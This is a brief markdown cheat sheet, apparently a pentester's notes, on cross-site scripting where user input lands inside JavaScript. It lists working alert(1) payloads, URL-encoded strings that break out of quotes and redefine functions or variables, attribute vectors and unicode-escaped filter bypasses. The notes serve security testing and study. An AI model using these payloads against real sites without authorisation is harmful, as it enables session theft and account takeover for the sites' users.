# XSS-Notes
XSS Scenarios

```
<script>
    leo.write('test','reflection_here')
</script>
```

Exploitable scenarios

```
vulnerableFunction('test', 'INJECTION');
```
```
//param='-alert(1)-'
vulnerableFunction('test', ''-alert(1)-''); 
```

Function injection

```
vulnerableFunction('test', ''-alert(1)-''); 

function vulnerableFunction(a,b){
    return 1
};
```
```
//Payload
param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
```

```
vulnerableFunction('test', 'test'); 

function vulnerableFunction(a,b){
    return 1
};

alert(1)
```

```
//Payload
param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
```

Variable injection

```
function myFunction(a,b){
    return 1
};
myFunction(a, 'test'); 
var a = 1;
alert(1);
```

```
//Payload
param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
```

## Debugging Client Side JS

download all the files locally and change set breakpoints in the JS code.

**"Dev Tools" --> "Sources" --> "Overrides"**

add this in function
```
debugger;
```

## input Validation (check HTML tags)
1. check multiple tags
```
<img>
<a>....
```
2. attributes
```
onclick="alert(1)"
href = "javascript:alert(1)"
```
3. inside <script> [....]  </script>
```
'-alert(1)-'
';-alert(1)//
\';alert(1)//

// encoded
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
Demo function
```
function myFunction(a,b){
    return 1;
}

myFunction(a,'<INJECTION>')
```
In UnExploitable Class
```
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// example
' ' -alert(1)- ' '
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
    return 1;
}
alert(1);
```





